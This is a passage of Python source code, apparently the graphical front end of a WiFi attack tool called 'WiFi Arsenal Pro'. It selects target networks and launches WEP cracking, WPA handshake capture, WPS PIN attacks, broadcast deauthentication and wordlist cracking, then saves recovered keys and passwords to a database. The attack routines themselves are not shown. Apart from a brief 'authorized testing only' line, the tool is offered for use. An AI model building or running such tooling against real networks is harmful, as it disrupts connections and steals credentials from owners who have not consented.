            self._show_error("Please select an interface first")
            return
        
        if self._check_monitor_mode():
            # Disable monitor mode
            try:
                if self.scanner:
                    self.scanner.disable_monitor_mode()
                
                self.monitor_btn.configure(text="Enable Monitor")
                self.status_indicator.configure(foreground=COLORS['warning'])
                self._update_status(f"Disabled monitor mode on {self.current_interface}")
            except Exception as e:
                self._show_error(f"Failed to disable monitor mode: {e}")
        else:
            # Enable monitor mode
            try:
                self.scanner = WiFiScanner(self.current_interface)
                if self.scanner.enable_monitor_mode():
                    self.monitor_btn.configure(text="Disable Monitor")
                    self.status_indicator.configure(foreground=COLORS['success'])
                    self._update_status(f"Enabled monitor mode on {self.scanner.monitor_interface}")
                    self.current_interface = self.scanner.monitor_interface
                else:
                    self._show_error("Failed to enable monitor mode")
            except Exception as e:
                self._show_error(f"Failed to enable monitor mode: {e}")
    
    def _toggle_scan(self):
        """Toggle WiFi scanning"""
        if not self.scanner:
            self._show_error("Please enable monitor mode first")
            return
        
        if not self.scanning:
            # Start scan
            if self.scanner.start_scan(self._update_scan_results):
                self.scanning = True
                self.scan_btn.configure(text="Stop Scan")
                self._update_status("Scanning started...")
            else:
                self._show_error("Failed to start scanning")
        else:
            # Stop scan
            self.scanner.stop_scan()
            self.scanning = False
            self.scan_btn.configure(text="Start Scan")
            self._update_status("Scanning stopped")
    
    def _update_scan_results(self, targets, clients):
        """Update scan results in GUI"""
        self.queue.put(('scan_results', {'targets': targets, 'clients': clients}))
    
    def _on_network_selected(self, event):
        """Handle network selection"""
        selection = self.network_tree.selection()
        if not selection:
            return
        
        item = self.network_tree.item(selection[0])
        bssid = item['values'][1]
        
        # Find target in scanner results
        if self.scanner:
            for target in self.scanner.targets:
                if target['bssid'] == bssid:
                    self.selected_target = target
                    self._update_target_info()
                    break
    
    def _update_target_info(self):
        """Update target information display"""
        if not self.selected_target:
            return
        
        info = f"""BSSID: {self.selected_target['bssid']}
ESSID: {self.selected_target['essid']}
Channel: {self.selected_target['channel']}
Power: {self.selected_target['power']} dBm
Encryption: {self.selected_target['encryption']}
Clients: {len(self.selected_target['clients'])}
"""
        
        self.target_text.delete(1.0, tk.END)
        self.target_text.insert(tk.END, info)
    
    def _launch_attack(self, attack_type):
        """Launch selected attack"""
        if not self.selected_target:
            self._show_error("Please select a target first")
            return
        
        if not self.attacker:
            self.attacker = WiFiAttacker(self.current_interface)
        
        # Start attack in separate thread
        threading.Thread(target=self._run_attack, args=(attack_type,), daemon=True).start()
    
    def _run_attack(self, attack_type):
        """Run attack in background thread"""
        self.attacking = True
        self.progress_bar.start()
        self._log_attack(f"Starting {attack_type} attack on {self.selected_target['bssid']}")
        
        result = None
        start_time = time.time()
        
        try:
            if attack_type == 'wep':
                result = self.attacker.attack_wep(
                    self.selected_target['bssid'],
                    self.selected_target['channel'],
                    lambda msg: self.queue.put(('attack_log', msg))
                )
            elif attack_type == 'handshake':
                result = self.attacker.attack_wpa_handshake(
                    self.selected_target['bssid'],
                    self.selected_target['channel'],
                    self.selected_target['essid'] if self.selected_target['essid'] != 'Hidden' else None,
                    lambda msg: self.queue.put(('attack_log', msg))
                )
                
                if result and result['success']:
                    # Save handshake to database
                    handshake = {
                        'bssid': self.selected_target['bssid'],
                        'essid': self.selected_target['essid'],
                        'file_path': result['file']
                    }
                    self.database.save_handshake(handshake)
                    self.queue.put(('refresh_handshakes', None))
            elif attack_type == 'wps':
                result = self.attacker.attack_wps(
                    self.selected_target['bssid'],
                    self.selected_target['channel'],
                    lambda msg: self.queue.put(('attack_log', msg))
                )
            elif attack_type == 'deauth':
                result = self.attacker.deauth_attack(
                    self.selected_target['bssid'],
                    None,  # Broadcast deauth
                    10,    # 10 packets
                    lambda msg: self.queue.put(('attack_log', msg))
                )
            
            duration = time.time() - start_time
            
            # Save attack to database
            if result:
                attack = {
                    'target_bssid': self.selected_target['bssid'],
                    'target_essid': self.selected_target['essid'],
                    'attack_type': attack_type,
                    'success': result['success'],
                    'result': result,
                    'duration': duration
                }
                self.database.save_attack(attack)
                self.queue.put(('refresh_results', None))
            
        except Exception as e:
            self._log_attack(f"Attack error: {str(e)}")
        finally:
            self.attacking = False
            self.progress_bar.stop()
            
            if result:
                if result['success']:
                    self._log_attack(f"Attack succeeded in {duration:.1f} seconds")
                    if 'key' in result:
                        self._log_attack(f"Key: {result['key']}")
                    if 'pin' in result:
                        self._log_attack(f"PIN: {result['pin']}")
                else:
                    self._log_attack(f"Attack failed: {result.get('error', 'Unknown error')}")
    
    def _on_handshake_selected(self, event):
        """Handle handshake selection"""
        selection = self.handshake_tree.selection()
        if not selection:
            return
        
        item = self.handshake_tree.item(selection[0])
        self.selected_handshake = {
            'id': item['values'][0],
            'bssid': item['values'][1],
            'essid': item['values'][2],
            'file': item['values'][3]
        }
    
    def _crack_handshake(self):
        """Crack selected handshake"""
        if not self.selected_handshake:
            self._show_error("Please select a handshake first")
            return
        
        # Select wordlist
        wordlist = filedialog.askopenfilename(
            title="Select Wordlist",
            initialdir="/usr/share/wordlists",
            filetypes=[("Wordlists", "*.txt"), ("All files", "*.*")]
        )
        
        if not wordlist:
            return
        
        # Start cracking in separate thread
        threading.Thread(
            target=self._run_handshake_crack,
            args=(self.selected_handshake, wordlist),
            daemon=True
        ).start()
    
    def _run_handshake_crack(self, handshake, wordlist):
        """Run handshake cracking in background"""
        self.attacking = True
        self.progress_bar.start()
        self._log_attack(f"Starting dictionary attack on {handshake['bssid']}")
        
        start_time = time.time()
        
        try:
            if not self.attacker:
                self.attacker = WiFiAttacker(self.current_interface)
            
            result = self.attacker.crack_wpa_handshake(
                handshake['file'],
                wordlist,
                handshake['essid'] if handshake['essid'] != 'Unknown' else None,
                lambda msg: self.queue.put(('attack_log', msg))
            )
            
            duration = time.time() - start_time
            
            if result['success']:
                self._log_attack(f"Success! Password: {result['key']}")
                
                # Update handshake in database
                conn = sqlite3.connect(self.database.db_file)
                c = conn.cursor()
                c.execute("UPDATE handshakes SET cracked=1, password=? WHERE bssid=?", 
                         (result['key'], handshake['bssid']))
                conn.commit()
                conn.close()
                
                self.queue.put(('refresh_handshakes', None))
            else:
                self._log_attack(f"Failed to crack handshake: {result['error']}")
                
        except Exception as e:
            self._log_attack(f"Cracking error: {str(e)}")
        finally:
            self.attacking = False
            self.progress_bar.stop()
    
    def _export_handshake(self):
        """Export selected handshake"""
        if not self.selected_handshake:
            self._show_error("Please select a handshake first")
            return
        
        filename = filedialog.asksaveasfilename(
            title="Export Handshake",
            defaultextension=".cap",
            filetypes=[("Capture files", "*.cap"), ("All files", "*.*")]
        )
        
        if filename:
            try:
                shutil.copy(self.selected_handshake['file'], filename)
                self._update_status(f"Handshake exported to {filename}")
            except Exception as e:
                self._show_error(f"Failed to export handshake: {str(e)}")
    
    def _delete_handshake(self):
        """Delete selected handshake"""
        if not self.selected_handshake:
            self._show_error("Please select a handshake first")
            return
        
        if messagebox.askyesno("Confirm", "Delete this handshake capture?"):
            try:
                os.unlink(self.selected_handshake['file'])
                
                # Remove from database
                conn = sqlite3.connect(self.database.db_file)
                c = conn.cursor()
                c.execute("DELETE FROM handshakes WHERE bssid=?", (self.selected_handshake['bssid'],))
                conn.commit()
                conn.close()
                
                self._load_handshakes()
                self.selected_handshake = None
                self._update_status("Handshake deleted")
            except Exception as e:
                self._show_error(f"Failed to delete handshake: {str(e)}")
    
    def _load_attack_history(self):
        """Load attack history from database"""
        attacks = self.database.get_attacks()
        
        for item in self.results_tree.get_children():
            self.results_tree.delete(item)
        
        for attack in attacks:
            result = json.loads(attack[6]) if attack[6] else {}
            status = "SUCCESS" if attack[5] else "FAILED"
            result_str = ""
            
            if 'key' in result:
                result_str = f"Key: {result['key']}"
            elif 'pin' in result:
                result_str = f"PIN: {result['pin']}"
            elif 'error' in result:
                result_str = result['error']
            
            self.results_tree.insert('', 'end', values=(
                attack[1][:19],  # Time
                attack[3],       # Target ESSID
                attack[4],       # Attack type
                status,
                result_str
            ))
    
    def _load_handshakes(self):
        """Load handshakes from database"""
        handshakes = self.database.get_handshakes()
        
        for item in self.handshake_tree.get_children():
            self.handshake_tree.delete(item)
        
        for hs in handshakes:
            status = "Cracked" if hs[5] else "Not cracked"
            if hs[5]:
                status += f" ({hs[6]})"
            
            self.handshake_tree.insert('', 'end', values=(
                hs[1],  # BSSID
                hs[2],  # ESSID
                hs[4],  # Captured
                status
            ))
    
    def _log_attack(self, message):
        """Log attack message"""
        self.queue.put(('attack_log', message))
    
    def _update_status(self, message):
        """Update status bar"""
        self.queue.put(('status', message))
    
    def _show_error(self, message):
        """Show error message"""
        self.queue.put(('error', message))
    
    def _process_queue(self):
        """Process messages from queue"""
        try:
            while True:
                msg_type, data = self.queue.get_nowait()
                
                if msg_type == 'scan_results':
                    self._update_network_tree(data['targets'])
                elif msg_type == 'attack_log':
                    self.attack_log.insert(tk.END, data + "\n")
                    self.attack_log.see(tk.END)
                elif msg_type == 'status':
                    self.status_label.configure(text=data)
                elif msg_type == 'error':
                    messagebox.showerror("Error", data)
                elif msg_type == 'refresh_results':
                    self._load_attack_history()
                elif msg_type == 'refresh_handshakes':
                    self._load_handshakes()
                
        except queue.Empty:
            pass
        finally:
            self.root.after(100, self._process_queue)
    
    def _update_network_tree(self, targets):
        """Update network treeview with scan results"""
        for item in self.network_tree.get_children():
            self.network_tree.delete(item)
        
        for target in targets:
            self.network_tree.insert('', 'end', values=(
                target['essid'],
                target['bssid'],
                target['channel'],
                target['power'],
                target['encryption'],
                len(target['clients']),
                datetime.now().strftime("%H:%M:%S")
            ))
            
            # Save to database
            self.database.save_network(target)
    
    def _install_dependencies(self):
        """Install required dependencies"""
        if messagebox.askyesno("Confirm", "Install all required dependencies?"):
            try:
                DependencyManager.check_root()
                DependencyManager.install_dependencies()
                messagebox.showinfo("Success", "Dependencies installed successfully")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to install dependencies: {str(e)}")
    
    def _download_wordlists(self):
        """Download common wordlists"""
        if messagebox.askyesno("Confirm", "Download common wordlists to /usr/share/wordlists?"):
            try:
                DependencyManager.download_wordlists()
                messagebox.showinfo("Success", "Wordlists downloaded successfully")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to download wordlists: {str(e)}")
    
    def _show_about(self):
        """Show about dialog"""
        about_text = f"""WiFi Arsenal Pro v{VERSION}

Advanced WiFi Security Auditing Platform

Developed by {AUTHOR}

Features:
- WEP/WPA/WPA2 cracking
- WPS PIN attacks
- Handshake capture
- Deauthentication attacks
- Comprehensive database

For educational and authorized testing only.
"""
        messagebox.showinfo("About WiFi Arsenal Pro", about_text)
    
    def _on_close(self):
        """Handle window close"""
        if self.scanner and self.scanning:
            self.scanner.stop_scan()
        
        if self.scanner:
            self.scanner.disable_monitor_mode()
        
        self.root.destroy()
    
    def run(self):
        """Run the application"""
        self.root.protocol("WM_DELETE_WINDOW", self._on_close)
        self.root.mainloop()

def main():
    """Main function"""
    print(f"WiFi Arsenal Pro v{VERSION}")
    print("Advanced WiFi Security Auditing Platform")
    print(f"Developed by {AUTHOR}")
    print("For educational and authorized testing only\n")
    
    # Check dependencies and root
    try:
        DependencyManager.check_root()
        DependencyManager.check_dependencies()
    except Exception as e:
        print(f"Error: {str(e)}")
        sys.exit(1)
    
    # Run GUI
    app = WiFiArsenalGUI()
    app.run()

if __name__ == "__main__":
    main()
